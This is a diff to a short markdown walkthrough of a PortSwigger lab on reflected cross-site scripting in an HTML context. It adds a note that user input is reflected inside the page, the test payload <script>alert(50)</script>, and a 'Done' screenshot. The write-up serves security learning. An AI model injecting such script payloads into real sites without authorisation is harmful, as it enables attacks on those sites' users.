@@ -18,5 +18,11 @@ tags:
 ## Show source code 
 ![a](/portswigger/XSS/Reflected%20XSS%20into%20HTML%20context%20with%20nothing%20encoded/images/input%20reflact%20source.png)
 ## Try to inject js
+>the input reflact inside tage so will try to open script tag 
+```html
+<script>alert(50)</script>
+```
 ![a](/portswigger/XSS/Reflected%20XSS%20into%20HTML%20context%20with%20nothing%20encoded/images/try%20to%20open%20script%20tag.png)
 
+## Done
+![a](/portswigger/XSS/Reflected%20XSS%20into%20HTML%20context%20with%20nothing%20encoded/images/done.png)
